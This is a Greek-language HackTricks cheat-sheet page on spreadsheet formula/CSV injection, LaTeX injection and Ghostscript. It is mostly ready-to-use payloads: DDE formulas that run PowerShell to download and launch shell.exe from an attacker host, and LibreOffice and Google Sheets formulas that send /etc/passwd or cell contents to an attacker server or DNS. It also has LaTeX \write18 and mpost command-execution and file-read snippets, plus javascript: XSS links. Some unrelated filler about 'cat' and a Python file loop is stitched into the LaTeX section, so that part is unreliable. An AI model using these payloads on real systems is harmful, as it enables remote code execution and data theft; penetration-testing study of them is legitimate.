# Εισαγωγή Τύπου/CSV/Έγγραφο/LaTeX/GhostScript

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Ο Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από διεπαφές προς διαδικτυακές εφαρμογές και συστήματα cloud. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Εισαγωγή Τύπου

### Πληροφορίες

Εάν η **είσοδός** σας **αντανακλάται** μέσα σε **αρχεία CSV** (ή οποιοδήποτε άλλο αρχείο που πιθανόν να ανοίξει ο **Excel**), μπορείτε να τοποθετήσετε **τύπους Excel** που θα εκτελεστούν όταν ο χρήστης **ανοίγει το αρχείο** ή όταν ο χρήστης **κάνει κλικ σε κάποιο σύνδεσμο** μέσα στο φύλλο του Excel.

{% hint style="danger" %}
Σήμερα, ο **Excel θα ειδοποιήσει** (αρκετές φορές) τον **χρήστη όταν κάτι φορτώνεται από έξω από το Excel** για να τον προφυλάξει από κακόβουλες ενέργειες. Επομένως, πρέπει να εφαρμοστεί ειδική προσπάθεια στον Κοινωνικό Μηχανισμό για το τελικό φορτίο.
{% endhint %}

### [Λίστα Λέξεων](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Υπερσύνδεσμος

**Το παρακάτω παράδειγμα είναι πολύ χρήσιμο για να εξαγάγετε περιεχόμενο από το τελικό αρχείο Excel και να πραγματοποιήσετε αιτήσεις σε αυθαίρετες τοποθεσίες. Αλλά απαιτεί τον χρήστη να κάνει κλικ στον σύνδεσμο (και να αποδεχθεί τις προειδοποιήσεις).**

Το παρακάτω παράδειγμα προήλθε από [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Φανταστείτε μια παραβίαση ασφάλειας σε ένα σύστημα διαχείρισης εγγραφών φοιτητών που εκμεταλλεύεται μια επίθεση εισροής CSV. Ο κύριος σκοπός του επιτιθέμενου είναι να διακινδυνεύσει το σύστημα που χρησιμοποιούν οι καθηγητές για τη διαχείριση των λεπτομερειών των φοιτητών. Η μέθοδος περιλαμβάνει την εισροή επιβλαβούς φορτίου από τον επιτιθέμενο στην εφαρμογή, συγκεκριμένα εισάγοντας επιβλαβείς τύπους στα πεδία που προορίζονται για τις λεπτομέρειες των φοιτητών. Η επίθεση εξελίσσεται ως εξής:

1. **Εισροή Επιβλαβούς Φορτίου:**
- Ο επιτιθέμενος υποβάλλει ένα φόρμα λεπτομερειών φοιτητή, αλλά περιλαμβάνει μια τύπο συνήθως χρησιμοποιούμενη σε υπολογιστικά φύλλα (π.χ. `=HYPERLINK("<κακόβουλος_σύνδεσμος>","Κάντε κλικ εδώ")`).
- Αυτή η τύπος σχεδιάστηκε για να δημιουργήσει έναν υπερσύνδεσμο, αλλά δείχνει προς ένα κακόβουλο διακομιστή που ελέγχεται από τον επιτιθέμενο.

2. **Εξαγωγή Παραβιασμένων Δεδομένων:**
- Οι καθηγητές, χωρίς να γνωρίζουν την παραβίαση, χρησιμοποιούν τη λειτουργικότητα της εφαρμογής για να εξάγουν τα δεδομένα σε ένα αρχείο CSV.
- Το αρχείο CSV, όταν ανοίγεται, περιέχει ακόμα το κακόβουλο φορτίο. Αυτό το φορτίο εμφανίζεται ως ένας κλικαρίσματος υπερσύνδεσμος στο υπολογιστικό φύλλο.

3. **Ενεργοποίηση της Επίθεσης:**
- Ένας καθηγητής κάνει κλικ στον υπερσύνδεσμο, πιστεύοντας ότι αποτελεί ένα νόμιμο μέρος των λεπτομερειών του φοιτητή.
- Μετά το κλικ, ευαίσθητα δεδομένα (πιθανώς περιλαμβανομένων λεπτομερειών από το υπολογιστικό φύλλο ή του υπολογιστή του καθηγητή) μεταδίδονται στον διακομιστή του επιτιθέμενου.

4. **Καταγραφή των Δεδομένων:**
- Ο διακομιστής του επιτιθέμενου λαμβάνει και καταγράφει τα ευαίσθητα δεδομένα που αποστέλλονται από τον υπολογιστή του καθηγητή.
- Ο επιτιθέμενος μπορεί στη συνέχεια να χρησιμοποιήσει αυτά τα δεδομένα για διάφορους κακόβουλους σκοπούς, περαιτέρω διακινδυνεύοντας την ιδιωτικότητα και την ασφάλεια των φοιτητών και του ιδρύματος.


### RCE

**Ελέγξτε την [αρχική ανάρτηση](https://notsosecure.com/data-exfiltration-formula-injection-part1) για περισσότερες λεπτομέρειες.**

Σε συγκεκριμένες διαμορφώσεις ή παλαιότερες εκδόσεις του Excel, μια λειτουργία που ονομάζεται Δυναμική Ανταλλαγή Δεδομένων (DDE) μπορεί να εκμεταλλευτεί για την εκτέλεση αυθαίρετων εντολών. Για να εκμεταλλευτείτε αυτό, πρέπει να ενεργοποιηθούν οι παρακάτω ρυθμίσεις:

- Πηγαίνετε στο Αρχείο → Επιλογές → Κέντρο Εμπιστοσύνης → Ρυθμίσεις Κέντρου Εμπιστοσύνης → Εξωτερικό Περιεχόμενο και ενεργοποιήστε την επιλογή **Εκκίνηση Διακομιστή Δυναμικής Ανταλλαγής Δεδομένων**.

Όταν ανοίγεται ένα υπολογιστικό φύλλο με το κακόβουλο φορτίο (και αν ο χρήστης αποδεχθεί τις προειδοποιήσεις), το φορτίο εκτελείται. Για παράδειγμα, για να εκκινήσει η εφαρμογή αριθμομηχανής, το φορτίο θα ήταν:
```markdown
`=cmd|' /C calc'!xxx`
```
Μπορούν επίσης να εκτελεστούν επιπλέον εντολές, όπως η λήψη και εκτέλεση ενός αρχείου χρησιμοποιώντας το PowerShell:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Εισαγωγή Τοπικού Αρχείου (LFI) στο LibreOffice Calc

Το LibreOffice Calc μπορεί να χρησιμοποιηθεί για την ανάγνωση τοπικών αρχείων και την εξαγωγή δεδομένων. Εδώ είναι μερικές μέθοδοι:

- Ανάγνωση της πρώτης γραμμής από το τοπικό αρχείο `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
- Εξαγωγή των αναγνωσμένων δεδομένων σε έναν διακινδυνευμένο διακομιστή ελεγκτή: `=WEBSERVICE(CONCATENATE("http://<διεύθυνση IP επιτιθέμενου>:8080/",('file:///etc/passwd'#$passwd.A1)))`
- Εξαγωγή περισσότερων από μία γραμμή: `=WEBSERVICE(CONCATENATE("http://<διεύθυνση IP επιτιθέμενου>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
- Εξαγωγή δεδομένων μέσω DNS (αποστολή αναγνωσμένων δεδομένων ως ερωτήματα DNS σε έναν διακομιστή DNS ελεγκτή): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<τομέας επιτιθέμενου>"))`

### Google Sheets για την Εξαγωγή Δεδομένων μέσω Out-of-Band (OOB)

Το Google Sheets προσφέρει λειτουργίες που μπορούν να εκμεταλλευτούνται για την εξαγωγή δεδομένων μέσω OOB:

- **CONCATENATE**: Συνενώνει αλφαριθμητικά - `=CONCATENATE(A2:E2)`
- **IMPORTXML**: Εισάγει δεδομένα από δομημένους τύπους δεδομένων - `=IMPORTXML(CONCAT("http://<διεύθυνση IP επιτιθέμενου:Θύρα>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
- **IMPORTFEED**: Εισάγει τροφοδοσίες RSS ή ATOM - `=IMPORTFEED(CONCAT("http://<διεύθυνση IP επιτιθέμενου:Θύρα>//123.txt?v=", CONCATENATE(A2:E2)))`
- **IMPORTHTML**: Εισάγει δεδομένα από πίνακες ή λίστες HTML - `=IMPORTHTML (CONCAT("http://<διεύθυνση IP επιτιθέμενου:Θύρα>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
- **IMPORTRANGE**: Εισάγει ένα εύρος κελιών από ένα άλλο φύλλο εργασίας - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Αναγνωριστικό_Φύλλου]", "sheet1!A2:E2")`
- **IMAGE**: Εισάγει μια εικόνα σε ένα κελί - `=IMAGE("https://<διεύθυνση IP επιτιθέμενου:Θύρα>/images/srpr/logo3w.png")`


## Εισαγωγή LaTeX

Συνήθως οι διακομιστές που θα βρείτε στο διαδίκτυο που **μετατρέπουν κώδικα LaTeX σε PDF** χρησιμοποιούν το **`pdflatex`**.\
Αυτό το πρόγραμμα χρησιμοποιεί 3 κύρια χαρακτηριστικά για να (απ)επιτρέψει την εκτέλεση εντολών:

* **`--no-shell-escape`**: **Απενεργοποιεί** την κατασκευή `\write18{command}`, ακόμα κι αν είναι ενεργοποιημένη στο αρχείο texmf.cnf.
* **`--shell-restricted`**: Ίδιο με το `--shell-escape`, αλλά **περιορίζεται** σε ένα 'ασφαλές' σύνολο **προκαθορισμένων** εντολών (\*\*Στο Ubuntu 16.04 η λίστα βρίσκεται στο `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Ενεργοποιεί** την κατασκευή `\write18{command}`. Η εντολή μπορεί να είναι οποιαδήποτε εντολή κέλυφους. Αυτή η κατασκευή απαγορεύεται κανονικά για λόγους ασφαλείας.

Ωστόσο, υπάρχουν και άλλοι τρόποι εκτέλεσης εντολών, οπότε για να αποφευχθεί η RCE είναι πολύ σημαντικό να χρησιμοποιηθεί το `--shell-restricted`.

### Ανάγνωση αρχείου <a href="#read-file" id="read-file"></a>

Μπορεί να χρειαστεί να προσαρμόσετε την εισαγωγή με περιτυλίγματα όπως \[ ή $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Διάβασμα αρχείου με μία γραμμή

Για να διαβάσετε ένα αρχείο με μία γραμμή, μπορείτε να χρησιμοποιήσετε την εντολή `cat` στο Linux. Η εντολή `cat` εμφανίζει το περιεχόμενο ενός αρχείου στο τερματικό.

```bash
cat filename
```

Αντικαταστήστε το `filename` με το όνομα του αρχείου που θέλετε να διαβάσετε. Η εντολή `cat` θα εμφανίσει το περιεχόμενο του αρχείου στο τερματικό.

Αν θέλετε να αποθηκεύσετε το περιεχόμενο του αρχείου σε ένα άλλο αρχείο, μπορείτε να χρησιμοποιήσετε την εντολή ανακατεύθυνσης εξόδου `>`.

```bash
cat filename > output.txt
```

Αυτή η εντολή θα δημιουργήσει ένα νέο αρχείο με όνομα `output.txt` και θα αποθηκεύσει το περιεχόμενο του αρχικού αρχείου σε αυτό το νέο αρχείο.
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Διάβασμα πολλαπλών γραμμών αρχείου

Για να διαβάσετε ένα αρχείο με πολλαπλές γραμμές, μπορείτε να χρησιμοποιήσετε την παρακάτω μέθοδο:

```python
with open('αρχείο.txt', 'r') as file:
    γραμμές = file.readlines()
    for γραμμή in γραμμές:
        print(γραμμή)
```

Αυτό το κομμάτι κώδικα ανοίγει το αρχείο με όνομα "αρχείο.txt" σε λειτουργία ανάγνωσης (`'r'`) και αποθηκεύει κάθε γραμμή του αρχείου σε μια λίστα με την χρήση της μεθόδου `readlines()`. Έπειτα, εκτυπώνει κάθε γραμμή με τη χρήση μιας `for` επανάληψης.

Μπορείτε να προσαρμόσετε τον κώδικα ανάλογα με τις ανάγκες σας, όπως να επεξεργαστείτε κάθε γραμμή ξεχωριστά ή να αποθηκεύσετε τις γραμμές σε μια άλλη δομή δεδομένων.
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Εγγραφή αρχείου <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Εκτέλεση εντολής <a href="#command-execution" id="command-execution"></a>

Η είσοδος της εντολής θα ανακατευθυνθεί στο stdin, χρησιμοποιήστε ένα προσωρινό αρχείο για να το λάβετε.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Εάν λάβετε οποιοδήποτε σφάλμα LaTex, σκεφτείτε να χρησιμοποιήσετε το base64 για να λάβετε το αποτέλεσμα χωρίς κακούς χαρακτήρες.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Από [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Εισαγωγή Ghostscript

**Ελέγξτε [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)**

## Αναφορές

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Βρείτε ευπάθειες που είναι πιο σημαντικές, ώστε να μπορείτε να τις διορθώσετε πιο γρήγορα. Το Intruder παρακολουθεί την επιθετική επιφάνεια σας, εκτελεί προληπτικές απειλητικές αναζητήσεις, εντοπίζει προβλήματα σε ολόκληρο το τεχνολογικό σας στοίχημα, από τις διεπαφές προγραμματισμού εφαρμογών (APIs) μέχρι τις ιστοσελίδες και τα συστήματα στον νέφος. [**Δοκιμάστε το δωρεάν**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) σήμερα.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
